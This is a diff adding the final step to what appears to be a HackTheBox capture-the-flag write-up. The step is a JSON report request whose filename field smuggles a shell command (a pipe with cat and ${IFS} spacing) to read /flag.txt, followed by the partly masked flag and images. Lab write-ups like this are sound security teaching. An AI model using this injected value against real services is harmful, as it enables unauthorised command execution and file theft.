@@ -155,6 +155,33 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJ
 
 > ## now read the flag
 
+```json
+{
+
+  "reportType":"user_activity",
+
+  "format":"txt",
+
+  "filename": "\"|cat${IFS}/flag.txt${IFS}1>&2\""
+
+}
+```
+
+<img width="1499" height="507" alt="image" src="https://github.com/user-attachments/assets/8103eea2-0b59-4370-bf6f-68beb8d180b3" />
+
+
+```
+HTB{4y4m3_g3kk0_m00nl1ght_4ll3ys**********************97b4b5b2f}
+```
+
+
+
+![DespicableMeMinionsGIF](https://github.com/user-attachments/assets/2ed952f7-c201-4aab-b2f9-74c0cc694353)
+
+
+
+
+
 
 
 
